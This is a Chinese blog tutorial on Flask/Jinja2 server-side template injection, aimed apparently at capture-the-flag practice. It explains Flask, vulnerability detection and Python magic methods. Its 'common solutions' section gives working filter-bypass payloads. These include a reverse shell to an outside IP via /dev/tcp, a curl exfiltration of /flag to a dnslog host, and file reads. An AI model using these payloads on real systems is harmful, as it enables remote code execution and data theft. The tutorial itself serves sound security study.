<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ssti模板注入 | 阿巴</title><meta name="author" content="阿巴"><meta name="copyright" content="阿巴"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SSTI模板注入flask基本介绍flask是一个使用python语言编写的轻量级web应用框架其WSGI工具箱采用Werkzeug，模板弓|擎则使用Jinja2。Flask使用BSD授权。 Flask的特点有:良好的文档、丰富的插件、包含开发服务器和调试器(debugger)、 集成支持单元测试、RESTful请求调度、 支持安全cookies、 基于Unicode。 Python可直接用f">
<meta property="og:type" content="article">
<meta property="og:title" content="ssti模板注入">
<meta property="og:url" content="http://example.com/2023/08/09/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="阿巴">
<meta property="og:description" content="SSTI模板注入flask基本介绍flask是一个使用python语言编写的轻量级web应用框架其WSGI工具箱采用Werkzeug，模板弓|擎则使用Jinja2。Flask使用BSD授权。 Flask的特点有:良好的文档、丰富的插件、包含开发服务器和调试器(debugger)、 集成支持单元测试、RESTful请求调度、 支持安全cookies、 基于Unicode。 Python可直接用f">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
<meta property="article:published_time" content="2023-08-09T11:46:00.000Z">
<meta property="article:modified_time" content="2024-07-14T07:43:12.328Z">
<meta property="article:author" content="阿巴">
<meta property="article:tag" content="web安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/08/09/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ssti模板注入',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-07-14 15:43:12'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">65</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="阿巴"><span class="site-name">阿巴</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ssti模板注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-08-09T11:46:00.000Z" title="Created 2023-08-09 19:46:00">2023-08-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-07-14T07:43:12.328Z" title="Updated 2024-07-14 15:43:12">2024-07-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ssti模板注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><span id="more"></span>

<h1 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h1><h2 id="flask基本介绍"><a href="#flask基本介绍" class="headerlink" title="flask基本介绍"></a>flask基本介绍</h2><p>flask是一个使用python语言编写的轻量级web应用框架其WSGI工具箱采用Werkzeug，模板弓|擎则使用Jinja2。Flask使用BSD授权。</p>
<p>Flask的特点有:良好的文档、丰富的插件、包含开发服务器和调试器(debugger)、 集成支持单元测试、RESTful请求调度、 支持安全cookies、 基于Unicode。</p>
<p>Python可直接用flask启动一个web服务页面。</p>
<p><strong>使用方法</strong>：在进入我们自己暗转环境的文件夹之后输入<code>source ./bin/activate</code>，便可以开始写代码了，以下为一段示例代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token operator">//</span>这里表示路由，可以自行修改为合适的，如修改为flag时，访问时要加IP<span class="token operator">/</span>flag才会显示内容
<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">return</span> <span class="token string">"hello world!"</span>
<span class="token keyword">if</span> __name__<span class="token operator">=</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
	app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">//</span>run中可填host<span class="token operator">=</span><span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.0</span>，表示可以被全部访问到，不填默认<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>，还可以debug<span class="token operator">=</span>true，这样会显示错误便于修改。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="flask的变量与方法"><a href="#flask的变量与方法" class="headerlink" title="flask的变量与方法"></a>flask的变量与方法</h3><p><strong>变量</strong>：</p>
<p>通过在代码中增加变量的方法。可以动态的使用url，以上边的示例为例，假设我们现在需要让他访问者输入什么，我们就输出什么就需要用到变量。代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>_ name
<span class="token decorator annotation punctuation">@app</span> <span class="token punctuation">.</span> route<span class="token punctuation">(</span> <span class="token string">' /benben/ &lt;name>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span> 
	<span class="token keyword">return</span> <span class="token string">"hello %s"</span> <span class="token operator">%</span> name
    <span class="token operator">//</span>这里的<span class="token operator">%</span>s和下面的<span class="token operator">%</span>d表示的数据的类型，跟python中的相同
<span class="token decorator annotation punctuation">@app</span> <span class="token punctuation">.</span> route<span class="token punctuation">(</span> <span class="token string">' /int/ &lt;int:postID>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">id</span><span class="token punctuation">(</span> postID<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">return</span> <span class="token string">" %d "</span> <span class="token operator">%</span> postID
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__ '</span> <span class="token punctuation">:</span>
	app<span class="token punctuation">.</span> run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span> <span class="token punctuation">,</span> debug<span class="token operator">=</span> <span class="token boolean">True</span> <span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8081</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>方法</strong></p>
<p>在flask中常见方法如下：</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%941.png"></p>
<p>用法实例如下图：</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%942.png"></p>
<h2 id="flask模板介绍"><a href="#flask模板介绍" class="headerlink" title="flask模板介绍"></a>flask模板介绍</h2><p>视图函数：一个处理http请求的函数，视图函数通过装饰器将其与一个特定的URL绑定起来，当用户访问该URL时，Flask会调用相应的视图函数来处理请求。</p>
<p>flask模板：lask模板是一种用于在Web应用程序中生成动态HTML内容的技术。它允许你将静态HTML文件与动态数据进行结合，以便根据不同的输入和条件生成不同的输出。</p>
<p>两者在flask中的作用：</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%943.png"></p>
<h2 id="模板注入漏洞"><a href="#模板注入漏洞" class="headerlink" title="模板注入漏洞"></a>模板注入漏洞</h2><p>常见的题解：</p>
<pre class="line-numbers language-none"><code class="language-none">过滤中括号，单双引号，下滑线：
&#123;&#123;()|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)()|attr(request.cookies.d)(406)|attr(request.cookies.e)|attr(request.cookies.f)|attr(request.cookies.g)(request.cookies.h)|attr(request.cookies.i)(request.cookies.j)|attr(request.cookies.k)()&#125;&#125;
cookies：a&#x3D;__class__; b&#x3D;__base__; c&#x3D;__subclasses__; d&#x3D;__getitem__; e&#x3D;__init__; f&#x3D;__globals__; g&#x3D;__getitem__; h&#x3D;os; i&#x3D;popen; j&#x3D;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;120.46.183.140&#x2F;8888 0&gt;&amp;1&quot;; k&#x3D;read

在上面的基础上再过滤双重大括号：
&#123;%print(()|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)()|attr(request.cookies.d)(406)|attr(request.cookies.e)|attr(request.cookies.f)|attr(request.cookies.g)(request.cookies.h)|attr(request.cookies.i)(request.cookies.j)|attr(request.cookies.k)())%&#125;
cookies与上边相同

在上面的基础上过滤了request
&#123;% set po&#x3D;dict(po&#x3D;a,p&#x3D;a)|join%&#125;&#123;% set a&#x3D;(()|select|string|list)|attr(po)(24)%&#125;&#123;% set ini&#x3D;(a,a,dict(init&#x3D;a)|join,a,a)|join()%&#125;&#123;% set glo&#x3D;(a,a,dict(globals&#x3D;a)|join,a,a)|join()%&#125;&#123;% set geti&#x3D;(a,a,dict(getitem&#x3D;a)|join,a,a)|join()%&#125;&#123;% set built&#x3D;(a,a,dict(builtins&#x3D;a)|join,a,a)|join()%&#125;&#123;% set x&#x3D;(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;% set chr&#x3D;x.chr%&#125;&#123;% set file&#x3D;chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;&#123;%print(x.open(file).read())%&#125;

在上面的基础上过滤数字：(全角数字绕过)
&#123;% set po&#x3D;dict(po&#x3D;a,p&#x3D;a)|join%&#125;&#123;% set a&#x3D;(()|select|string|list)|attr(po)(２４)%&#125;&#123;% set ini&#x3D;(a,a,dict(init&#x3D;a)|join,a,a)|join()%&#125;&#123;% set glo&#x3D;(a,a,dict(globals&#x3D;a)|join,a,a)|join()%&#125;&#123;% set geti&#x3D;(a,a,dict(getitem&#x3D;a)|join,a,a)|join()%&#125;&#123;% set built&#x3D;(a,a,dict(builtins&#x3D;a)|join,a,a)|join()%&#125;&#123;% set x&#x3D;(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;% set chr&#x3D;x.chr%&#125;&#123;% set file&#x3D;chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%&#125;&#123;%print(x.open(file).read())%&#125;

ban掉print：dnslog外带，数字可以用全角数字替换
?name&#x3D;&#123;%set a&#x3D;dict(po&#x3D;aa,p&#x3D;aa)|join%&#125;&#123;%set j&#x3D;dict(eeeeeeeeeeeeeeeeee&#x3D;a)|join|count%&#125;&#123;%set k&#x3D;dict(eeeeeeeee&#x3D;a)|join|count%&#125;&#123;%set l&#x3D;dict(eeeeeeee&#x3D;a)|join|count%&#125;&#123;%set n&#x3D;dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee&#x3D;a)|join|count%&#125;&#123;%set m&#x3D;dict(eeeeeeeeeeeeeeeeeeee&#x3D;a)|join|count%&#125;&#123;% set b&#x3D;(lipsum|string|list)|attr(a)(j)%&#125;&#123;%set c&#x3D;(b,b,dict(glob&#x3D;cc,als&#x3D;aa)|join,b,b)|join%&#125;&#123;%set d&#x3D;(b,b,dict(getit&#x3D;cc,em&#x3D;aa)|join,b,b)|join%&#125;&#123;%set e&#x3D;dict(o&#x3D;cc,s&#x3D;aa)|join%&#125;&#123;% set f&#x3D;(lipsum|string|list)|attr(a)(k)%&#125;&#123;%set g&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;&#123;%set p&#x3D;((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;&#123;%set q&#x3D;((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;&#123;%set i&#x3D;(dict(curl&#x3D;aa)|join,f,p,dict(cat&#x3D;a)|join,f,g,dict(flag&#x3D;aa)|join,p,q,dict(得到的外带地址&#x3D;a)|join,q,dict(dnslog&#x3D;a)|join,q,dict(cn&#x3D;a)|join)|join%&#125;&#123;%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;XiLitter&#123;%endif%&#125;
aoafbo.dnslog.cn
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="flask漏洞"><a href="#flask漏洞" class="headerlink" title="flask漏洞"></a>flask漏洞</h3><p><strong>漏洞成因</strong>：在模板渲染时没有对用户的输入进行严格的过滤，或使用了危险的模板，导致用户和flask程序可以交互，导致出现漏洞。漏洞会导致任意文件读取，和命令执行</p>
<p>漏洞展示：</p>
<p>正常代码：</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%944.png"></p>
<p>漏洞代码：</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%945.png"></p>
<p>上面两端代码，第一张是先解析在放入模板中，第二张是先到模板中，在解析，再进行显示，这种情况，如果没有过滤，就会导致注入现象发生。</p>
<h3 id="漏洞的判断"><a href="#漏洞的判断" class="headerlink" title="漏洞的判断"></a>漏洞的判断</h3><p>通过下图可以逐步判断漏洞的模板类型</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%946.png"></p>
<p>红色是未响应，如${7*7}无响应就是显示原值，有响应会返回49，绿色是有响应，通过这个逻辑我们可以判断是那个一种模板</p>
<h3 id="继承关系和魔术方法"><a href="#继承关系和魔术方法" class="headerlink" title="继承关系和魔术方法"></a>继承关系和魔术方法</h3><h4 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h4><p>一下面的一段代码为例：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">:</span> <span class="token keyword">pass</span>
<span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">pass</span>
<span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">pass</span>
<span class="token keyword">class</span> <span class="token class-name">D</span><span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">pass</span>

c <span class="token operator">=</span> C <span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">)</span>
<span class="token comment">#运行结果：</span>
<span class="token comment">#&lt;class '__main__.C'></span>
<span class="token comment">#(&lt;class '__main__.C'>, &lt;class '__main__.B'>, &lt;class '__main__.A'>, &lt;class 'object'>)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到运行到最后显示A的父类是object，故可得，他是所有父子关系的顶层。其他的关系见下图：</p>
<p><img src="/../../source/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%947.png"></p>
<p><strong>魔术方法</strong></p>
<p><code>class</code>：查找当前类型的所属对象</p>
<p><code>base</code>：沿着父子类的关系往上走一个</p>
<p><code>mro</code>：查找当前类对象的所有继承类</p>
<p><code>subclasses_ ()</code> ：查找父类下的所有子类</p>
<p><code>_init_ </code>：查看类是否重载，重载是指程序在运行时就已经加载好了这个模块到内存中，如果出现wrapper字眼，说明没有重载</p>
<p><code>_globals__</code>：函数会议字典的形式返回当前对象的全部全局变量</p>
<p>常用类的用法：</p>
<pre class="line-numbers language-none"><code class="language-none">__class__            	类的一个内置属性，表示实例对象的类。
__base__             	类型对象的直接基类
__bases__            	类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              	此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
__subclasses__()     	返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method 							returns a list of all those references still alive. The list is in definition order.

__init__             	初始化类，返回的类型是function
__globals__          	使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
__dic__              	类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
__getattribute__()   	实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx&#x2F;a.xxx()），都会自动						  去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。

__getitem__()        	调用字典中的键值，其实就是调用这个魔术方法，比如a[&#39;b&#39;]，就是a.__getitem__(&#39;b&#39;)
__builtins__         	内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多						  常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。

__import__           	动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]
__str__()            	返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              	flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。
get_flashed_messages 	flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。
lipsum               	flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：   													 &#123;&#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;

current_app          	应用上下文，一个全局变量。

request              	可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函 														 数:request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;proc\self\fd&#x2F;3&#39;).read()

request.args.x1   	 	get传参
request.values.x1 	 	所有参数
request.cookies      	cookies参数
request.headers      	请求头参数
request.form.x1   	 	post传参	(Content-Type:applicaation&#x2F;x-www-form-urlencoded或multipart&#x2F;form-data)
request.data  		 	post传参	(Content-Type:a&#x2F;b)
request.json		 	post传json  (Content-Type: application&#x2F;json)
config               	当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read() 						 &#125;&#125;
g                    	&#123;&#123;g&#125;&#125;得到&lt;flask.g of &#39;flask_ssti&#39;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>常用过滤器：</p>
<pre class="line-numbers language-none"><code class="language-none">int()：			将值转换为int类型；

float()：		将值转换为float类型；

lower()：		将字符串转换为小写；

upper()：		将字符串转换为大写；

title()：		把值中的每个单词的首字母都转成大写；

capitalize()：	把变量值的首字母转成大写，其余字母转小写；

trim()：			截取字符串前面和后面的空白字符；

wordcount()：	计算一个长字符串中单词的个数；

reverse()：		字符串反转；

replace(value,old,new)： 替换将old替换为new的字符串；

truncate(value,length&#x3D;255,killwords&#x3D;False)：截取length长度的字符串；

striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；

escape()或e：	转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。

safe()： 	禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#39;&lt;em&gt;hello&lt;&#x2F;em&gt;&#39;|safe&#125;&#125;；

list()：		将变量列成列表；

string()：	将变量转换成字符串；

join()：		将一个序列中的参数值拼接成字符串。示例看上面payload；

abs()：		返回一个数值的绝对值；

first()：	返回一个序列的第一个元素；

last()：		返回一个序列的最后一个元素；

format(value,arags,*kwargs)： 格式化字符串。比如：&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#39;Hello?&#39;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!

length()： 	返回一个序列或者字典的长度；

sum()： 		返回列表内数值的和；

sort()： 	返回排序后的列表；

default(value,default_value,boolean&#x3D;false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#39;xiaotuo&#39;)----如果name不存在，											  则会使用xiaotuo来替代。boolean&#x3D;False默认是在只有这个变量为undefined的时候才会使用default中的											  值，如果想使用python的形式判断是否为false，则可以传递boolean&#x3D;true。也可以使用or来替换。

length() 	返回字符串的长度，别名是count<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="常用注入模块详解"><a href="#常用注入模块详解" class="headerlink" title="常用注入模块详解"></a>常用注入模块详解</h4><p>可用的注入模块：</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%948.png"></p>
<p>在这些模块中存在可以查看文件和命令执行的方法。</p>
<p>常见方法快速查找表：</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%9410.png"></p>
<h5 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h5><p>查找子类<code>_frozen_importib_external.Filel oader</code><br><code>&lt;class &#39; frozen_ jimportlib_ external.FileLoader&#39;&gt;</code></p>
<p>可用有如下脚本：</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%949.png"></p>
<p>通过此脚本可以快速查看我们目标方法所在位置。</p>
<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><h5 id="内建函数eval执行命令"><a href="#内建函数eval执行命令" class="headerlink" title="内建函数eval执行命令"></a>内建函数eval执行命令</h5><p>内建函数：在python执行脚本时自动加载的函数，python脚本查看可利用eval命令执行。</p>
